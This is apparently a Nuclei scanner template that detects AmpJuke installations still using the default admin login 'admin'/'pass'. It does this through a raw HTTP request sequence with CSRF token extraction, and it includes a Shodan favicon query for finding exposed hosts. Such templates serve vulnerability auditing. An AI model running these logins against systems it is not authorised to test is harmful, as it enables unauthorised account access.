http:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: token
    part: body_1
    regex:
    - name="uuid" value="([./a-z0-9-]+)">
    type: regex
  matchers:
  - case-insensitive: true
    condition: and
    part: body_3
    type: word
    words:
    - AmpJuke
    - Track
    - Logout
    - Random play
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - pass
    username:
    - admin
  raw:
  - 'GET /login.php HTTP/2

    Host: {{Hostname}}

    '
  - 'POST /loginvalidate.php HTTP/2

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    uuid={{url_encode(token)}}&login={{username}}&password={{password}}&Submit=Submit

    '
  - 'GET /index.php?what=welcome HTTP/2

    Host: {{Hostname}}

    '
id: ampjuke-default-login
info:
  author: ritikchaddha
  description: 'AmpJuke contains a default login vulnerability. Default admin login
    password ''pass'' was found.

    '
  metadata:
    max-request: 3
    shodan-query: http.favicon.hash:-121681558
  name: AmpJuke - Default Login
  severity: high
  tags: default-login,ampjuke
